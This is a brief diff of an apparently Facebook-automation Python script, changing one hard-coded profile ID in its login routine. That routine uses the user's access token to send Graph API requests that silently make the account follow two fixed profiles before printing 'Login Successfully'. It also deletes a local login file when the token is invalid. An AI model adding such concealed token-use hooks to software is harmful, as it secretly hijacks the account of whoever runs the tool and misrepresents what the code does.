@@ -67,7 +67,7 @@ def bot_follow():
         print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
         os.system('rm -rf login.txt')
  
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100002725312525/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
